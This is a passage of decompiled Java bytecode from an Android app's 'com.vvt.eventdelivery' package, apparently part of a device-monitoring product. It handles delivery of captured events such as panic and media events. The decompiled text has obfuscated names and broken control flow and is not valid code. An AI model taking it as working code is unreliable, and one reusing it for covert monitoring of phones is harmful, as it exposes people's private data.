    //   284: invokevirtual 420	java/lang/Long:longValue	()J
    //   287: lstore 13
    //   289: getstatic 31	com/vvt/eventdelivery/MyUncaughtExceptionHandler:a	Z
    //   292: istore_3
    //   293: iload_3
    //   294: ifeq +3 -> 297
    //   297: aload_0
    //   298: getfield 64	com/vvt/eventdelivery/MyUncaughtExceptionHandler:FxFileObserverWorker	Lcom/vvt/eventrepository/removeFromPath;
    //   301: astore 5
    //   303: aload 5
    //   305: lload 13
    //   307: invokeinterface 429 3 0
    //   312: goto -58 -> 254
    //   315: aload_0
    //   316: getfield 64	com/vvt/eventdelivery/MyUncaughtExceptionHandler:FxFileObserverWorker	Lcom/vvt/eventrepository/removeFromPath;
    //   319: astore 5
    //   321: aload 5
    //   323: aload 4
    //   325: invokeinterface 432 2 0
    //   330: iload_2
    //   331: istore_3
    //   332: goto -120 -> 212
    //   335: getstatic 38	com/vvt/eventdelivery/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   338: istore_3
    //   339: iload_3
    //   340: ifeq +3 -> 343
    //   343: iconst_0
    //   344: istore_3
    //   345: aconst_null
    //   346: astore 5
    //   348: goto -136 -> 212
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	351	0	this	MyUncaughtExceptionHandler
    //   0	351	1	parami	i
    //   1	330	2	bool1	boolean
    //   5	2	3	bool2	boolean
    //   48	2	3	n	int
    //   76	269	3	bool3	boolean
    //   15	309	4	localEventKeys	EventKeys
    //   27	95	5	localObject1	Object
    //   197	1	5	localObject2	Object
    //   210	137	5	localObject3	Object
    //   67	15	6	localIterator1	Iterator
    //   100	132	7	bool4	boolean
    //   126	141	8	localObject4	Object
    //   135	17	9	localIterator2	Iterator
    //   172	14	10	l1	long
    //   181	7	12	bool5	boolean
    //   287	19	13	l2	long
    // Exception table:
    //   from	to	target	type
    //   53	58	197	finally
    //   60	67	197	finally
    //   69	76	197	finally
    //   81	88	197	finally
    //   90	95	197	finally
    //   97	100	197	finally
    //   107	112	197	finally
    //   121	126	197	finally
    //   128	135	197	finally
    //   137	144	197	finally
    //   151	158	197	finally
    //   160	165	197	finally
    //   167	172	197	finally
    //   174	178	197	finally
    //   187	194	197	finally
    //   224	229	197	finally
    //   238	243	197	finally
    //   245	252	197	finally
    //   254	261	197	finally
    //   266	273	197	finally
    //   275	280	197	finally
    //   282	287	197	finally
    //   289	292	197	finally
    //   297	301	197	finally
    //   305	312	197	finally
    //   315	319	197	finally
    //   323	330	197	finally
  }
  
  private int g(EventDelivery.Type paramType)
  {
    EventDelivery.Type localType = EventDelivery.Type.TYPE_PANIC;
    if (paramType == localType) {}
    for (int n = 30000;; n = 120000) {
      return n;
    }
  }
  
  private EventKeys g(i parami)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = parami.b();
    localObject = a((DataProviderType)localObject);
    boolean bool2 = false;
    if (localObject != null)
    {
      String str = this.j;
      localObject = a(b.a(str, (EventDelivery.Type)localObject));
      boolean bool3 = localObject instanceof EventKeys;
      if (!bool3) {}
    }
    for (localObject = (EventKeys)localObject;; localObject = null)
    {
      if (localObject == null)
      {
        localObject = new com/vvt/eventrepository/eventresult/EventKeys;
        ((EventKeys)localObject).<init>();
      }
      bool2 = a;
      if (bool2) {}
      return (EventKeys)localObject;
      bool1 = false;
    }
  }
  
  public void a(i parami)
  {
    boolean bool1 = a;
    if ((!bool1) || (parami == null))
    {
      bool1 = b;
      if (!bool1) {}
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      Object localObject = parami.b();
      localObject = a((DataProviderType)localObject);
      boolean bool2 = a;
      if (bool2) {}
      EventDelivery.Type localType = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
      if (localObject == localType)
      {
        int n = e(parami);
        a(parami, false, n);
      }
      else
      {
        a(parami, false);
      }
    }
  }
  
  public void a(EventDelivery.Type paramType, int paramInt)
  {
    a(paramType, paramInt, null);
  }
  
  public void a(EventDelivery.Type paramType, int paramInt, com.vvt.datadeliverymanager.a.a parama)
  {
    boolean bool = b;
    if (bool) {}
    bool = b;
    if (bool) {}
    bool = b;
    if (bool) {}
    EventDelivery.Type localType = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
    if (paramType == localType)
    {
      bool = b;
      if (bool) {}
      a(paramInt, parama);
    }
    for (;;)
    {
      bool = b;
      if (bool) {}
      b(paramType, paramInt, parama);
      bool = b;
      if (bool) {}
      return;
      a(paramType, parama);
    }
  }
  
  public void b(i parami)
  {
    boolean bool = a;
    if ((!bool) || (parami == null))
    {
      bool = c;
      if (!bool) {}
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      c(parami);
    }
  }
  
  public String toString()
  {
    return "EventDeliveryHelper";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/eventdelivery/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */